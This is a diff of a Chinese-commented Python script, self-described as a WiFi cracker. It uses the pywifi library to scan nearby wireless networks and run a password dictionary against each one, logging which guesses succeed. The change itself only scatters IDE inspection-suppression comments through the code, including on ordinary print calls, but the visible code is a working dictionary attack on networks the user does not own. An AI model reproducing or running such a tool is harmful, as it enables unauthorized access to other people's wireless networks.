@@ -1,7 +1,10 @@
 # coding:utf-8
+# noinspection PyUnresolvedReferences
 import time  #时间
 import pywifi  #破解wifi
+# noinspection PyUnresolvedReferences
 from pywifi import const  #引用一些定义
+# noinspection PyUnresolvedReferences
 from asyncio.tasks import sleep
 # 需要第三方库 pywifi  (python3 pip install pywifi)
 # 缺陷： wifi名编码为乱码时会导致崩溃
@@ -19,10 +22,13 @@ class PoJie():
         assert self.iface.status() in\
             [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
     def readPassWord(self,wifissid):  # 读取密码字典，进行匹配
+            # noinspection PyUnresolvedReferences
             print("开始破解： %s"%wifissid)
             # 将结果写入文本文件记录
             res = "开始破解：: %s \n"%wifissid;
+            # noinspection PyUnresolvedReferences
             open(self.resfiles,"a").write(res)
+            # noinspection PyUnresolvedReferences
             pwdfilehander=open(self.pwdfile,"r",errors="ignore")
             while True:
                 try:
@@ -34,25 +40,33 @@ class PoJie():
                         # print("密码正确："+myStr)
                         # res = "密码:%s 正确 \n"%myStr;
                         res = "===正确=== ^_^ wifi名:%s  匹配密码：%s "%(wifissid,myStr);
+                        # noinspection PyUnresolvedReferences
                         print(res)
                         # 将结果写入文本文件记录
+                        # noinspection PyUnresolvedReferences
                         open(self.resfiles,"a").write(res)
                         break
                     else:
                         # print("密码:"+myStr+"错误")
                         res = "---错误--- wifi名:%s匹配密码：%s"%(wifissid,myStr);
+                        # noinspection PyUnresolvedReferences
                         print(res)
                         # 将结果写入文本文件记录
+                        # noinspection PyUnresolvedReferences
                         open(self.resfiles,"a").write(res)
                     sleep(3)
                 except:
                     continue
     def foreachPassWord(self):  # 读取密码字典，进行匹配
+            # noinspection PyUnresolvedReferences
             print("开始扫描附近wifi...")
             wifi_list = self.scans_wifi_list()
+            # noinspection PyUnresolvedReferences
             print("扫描完成! ^_^")
+            # noinspection PyUnresolvedReferences
             for index,wifi_info in enumerate(wifi_list):
                 self.readPassWord(wifi_info.ssid)
+            # noinspection PyUnresolvedReferences
             print("执行完毕! ^_^")
     def scans_wifi_list(self):  # 扫描周围wifi列表
         #开始扫描
@@ -61,13 +75,16 @@ class PoJie():
         #在若干秒后获取扫描结果
         scanres = self.iface.scan_results()
         #统计附近被发现的热点数量
+        # noinspection PyUnresolvedReferences
         nums = len(scanres)
         # print("|SCAN GET %s"%(nums))
+        # noinspection PyUnresolvedReferences
         print("|扫描数量: %s"%(nums))
         # 在控制台表格输出 扫描列表
         # return self.iface.scan_results()
         # 表格 标题行
         # print ("%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s"%("-"*70,6,"WIFIID",18,"SSID OR BSSID",2,"N",4,"time",7,"signal",10,"KEYNUM",10,"KEY","="*70))
+        # noinspection PyUnresolvedReferences
         print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
         # 实际数据
         self.show_scans_wifi_list(scanres)
@@ -75,8 +92,10 @@ class PoJie():
     def show_scans_wifi_list(self,scans_res):  # 显示扫描周围wifi列表
         #开始扫描
         # self.scans_wifi_list()
+        # noinspection PyUnresolvedReferences
         for index,wifi_info in enumerate(scans_res):
             # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
+            # noinspection PyUnresolvedReferences
             print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
     def test_connect(self,findStr,wifissid):#测试链接
         profile = pywifi.Profile()  #创建wifi链接文件
@@ -103,6 +122,7 @@ class PoJie():
             [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
         return isOK
     def __del__(self):
+        # noinspection PyUnresolvedReferences
         self.file.close()
 
 # 类写完
